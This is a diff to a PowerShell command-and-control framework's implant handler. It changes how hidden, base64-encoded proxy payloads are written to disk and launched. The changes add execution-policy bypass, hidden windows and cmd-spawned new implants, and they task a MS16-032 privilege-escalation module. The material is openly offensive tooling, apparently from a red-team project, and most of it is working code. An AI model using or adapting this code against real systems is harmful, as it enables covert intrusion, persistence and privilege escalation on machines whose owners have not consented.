@@ -409,8 +409,9 @@ function Implant-Handler
         $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
         [IO.File]::WriteAllLines("$FolderPath\proxypayload.bat", $payload)
-
+        [IO.File]::WriteAllLines("C:\Temp\PowershellC2\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
         Write-Host -Object "Payload written to: $FolderPath\proxypayload.bat"  -ForegroundColor Green
+        Write-Host -Object "Payload written to: C:\Temp\PowershellC2\Modules\proxypayload.ps1"  -ForegroundColor Green
     }
 
 function Resolve-PathSafe
@@ -789,9 +790,9 @@ $error.clear()
             if ($pscommand -eq 'StartAnotherImplantWithProxy') 
             {
                 if (Test-Path "$FolderPath\proxypayload.bat"){ 
-                $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"
-                $proxypayload = $proxypayload -replace 'powershell ', ''
-                $pscommand = "start-process -windowstyle hidden powershell -args '"+$proxypayload+"'"
+                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
+                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
+                $pscommand = 'start-process -windowstyle hidden cmd -args "/c $proxypayload"'
                 } else {
                 write-host "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
@@ -799,9 +800,7 @@ $error.clear()
             }
             if ($pscommand -eq 'StartAnotherImplant') 
             {
-                $payload = Get-Content -Path "$FolderPath\payload.bat"
-                $payload = $payload -replace 'powershell ', ''
-                $pscommand = "start-process -windowstyle hidden powershell -args '"+$payload+"'"
+                $pscommand = 'start-process -windowstyle hidden cmd -args "/c $payload"'
             }
             if ($pscommand.ToLower().StartsWith('get-proxy')) 
             {
@@ -851,13 +850,7 @@ $error.clear()
             if ($pscommand -eq 'invoke-ms16-032-proxypayload')
             { 
                 if (Test-Path "$FolderPath\proxypayload.bat"){ 
-                $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"               
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = '$proxypayload = "'+$proxypayload+'"'
-                } | Out-Null
+                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
                 } else {
